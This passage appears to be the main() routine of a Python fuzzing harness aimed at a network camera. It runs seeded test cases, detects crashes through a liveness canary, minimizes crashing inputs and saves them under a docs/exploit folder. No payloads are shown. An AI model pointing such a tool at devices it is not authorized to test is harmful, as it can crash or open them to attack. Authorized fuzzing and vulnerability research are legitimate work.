    ap.add_argument("--port", type=int, default=PORT)
    ap.add_argument("--batch", default="1")
    ap.add_argument("--seed", type=lambda s: int(s, 0), default=0xF5)
    ap.add_argument("--limit", type=int, default=MAX_BATCH)
    ap.add_argument("--jobs", type=int, default=1, choices=range(1, MAX_JOBS + 1))
    ap.add_argument("--classes", default="", help="comma-separated class filter")
    ap.add_argument("--log", default=LOG_DEFAULT)
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--list-classes", action="store_true")
    ap.add_argument("--minimize", metavar="CASE", help="minimize case id from a clean catalogue, or path to a .bin")
    args = ap.parse_args(argv)

    if args.jobs > MAX_JOBS:
        print("jobs must be <= 4", file=sys.stderr)
        return 4
    if os.geteuid() != 0:
        print(
            "warning: not root; macOS Local Network Privacy can turn LAN connects\n"
            "         into EHOSTUNREACH for unsigned interpreters. Re-run with sudo.",
            file=sys.stderr,
        )
    if args.limit > MAX_BATCH:
        print(f"limit clamped to {MAX_BATCH}", file=sys.stderr)
        args.limit = MAX_BATCH

    cases = build_cases()
    if args.list_classes:
        seen = []
        for c in cases:
            if c.cls not in seen:
                seen.append(c.cls)
        print("\n".join(f"{cls}\t{sum(1 for c in cases if c.cls == cls)}" for cls in seen))
        return 0
    if args.classes:
        wanted = {x.strip() for x in args.classes.split(",") if x.strip()}
        cases = [c for c in cases if c.cls in wanted]
        if not cases:
            print("no cases for filter", file=sys.stderr)
            return 4
    cases = cases[: args.limit]

    rng = random.Random(args.seed)
    # Keep class order (prime suspects first) but let the seed choose the order
    # inside each class.
    by_class: dict[str, list[Case]] = {}
    for c in cases:
        by_class.setdefault(c.cls, []).append(c)
    cases = []
    for group in by_class.values():
        rng.shuffle(group)
        cases.extend(group)

    if args.minimize:
        src = next((c for c in build_cases() if c.id == args.minimize), None)
        if src is not None:
            data = b"".join(src.frames)
        else:
            with open(args.minimize, "rb") as fh:
                data = fh.read()
        ok, _ = probe_alive(args.host, args.port)
        if not ok:
            print("host unreachable", file=sys.stderr)
            return 3
        print(f"minimizing {len(data)} bytes ...")
        small = minimize(data, args.host, args.port)
        print(f"crashes at {len(small)} bytes:\n{small!r}")
        out = f"docs/exploit/{os.path.basename(args.minimize)}.min.bin"
        with open(out, "wb") as fh:
            fh.write(small)
        print(f"wrote {out}")
        return 2

    if args.dry_run:
        for c in cases:
            print(f"{c.id} {c.cls} {c.note} ({sum(len(f) for f in c.frames)}B)")
        return 0

    canary = Canary(args.host, args.port)
    baseline_ok, why = canary.ensure(attempts=30, gap=2.0)
    if not baseline_ok:
        print(f"camera not answering OPTIONS: {why}", file=sys.stderr)
        return 3

    log = Log(args.log, args.seed, args.batch)
    log.note(f"baseline OPTIONS ok; {len(cases)} cases; jobs={args.jobs}")
    crash = None

    # Sequential is the default because the camera cap is per-IP and shared
    # across every agent on this host.
    if args.jobs == 1:
        for case in cases:
            res = run_case(case, args.host, args.port, canary)
            res.seed = args.seed
            log.write(res)
            print(f"{case.id} {case.cls:16s} {res.outcome:10s} {case.note[:60]}")
            if res.verdict and res.verdict.crashed:
                crash = res
                break
    else:
        from concurrent.futures import ThreadPoolExecutor

        def work(case: Case) -> Result:
            res = run_case(case, args.host, args.port, canary)
            res.seed = args.seed
            return res

        with ThreadPoolExecutor(max_workers=args.jobs) as ex:
            futures = [ex.submit(work, c) for c in cases]
            for case, fut in zip(cases, futures):
                res = fut.result()
                log.write(res)
                print(f"{case.id} {case.cls:16s} {res.outcome:10s} {case.note[:60]}")
                if res.verdict and res.verdict.crashed:
                    crash = res
                    for f in futures:
                        f.cancel()
                    break

    if crash is None:
        log.note(f"batch {args.batch} clean: {len(cases)} cases")
        log.close()
        return 0

    log.note(
        f"**CRASH** case {crash.case.id} seed {args.seed:#x}: {crash.verdict.detail} "
        f"(recovered={crash.verdict.recovered})"
    )
    raw = b"".join(crash.case.frames)
    log.note(f"raw {len(raw)}B:\n```\n{esc(raw, 8192)}\n```")
    print(f"\nCRASH {crash.case.id} ({len(raw)}B); minimizing ...")
    small = minimize(raw, args.host, args.port)
    log.note(f"minimized {len(small)}B:\n```\n{esc(small, 4096)}\n```\nsha256={hashlib.sha256(small).hexdigest()}")

    event = {
        "ts": now_iso(),
        "host": args.host,
        "case": crash.case.id,
        "class": crash.case.cls,
        "seed": args.seed,
        "raw_hex": raw.hex(),
        "min_hex": small.hex(),
        "min_len": len(small),
        "min_sha256": hashlib.sha256(small).hexdigest(),
        "verdict": crash.verdict.detail,
    }
    os.makedirs("docs/exploit", exist_ok=True)
    with open("docs/exploit/fuzz-crash.json", "w", encoding="utf-8") as fh:
        json.dump(event, fh, indent=2)
        fh.write("\n")
    log.close()
    print(f"minimized to {len(small)}B; wrote docs/exploit/fuzz-crash.json")
    print(esc(small, 480))
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main(sys.argv[1:]))
    except KeyboardInterrupt:
        sys.exit(130)
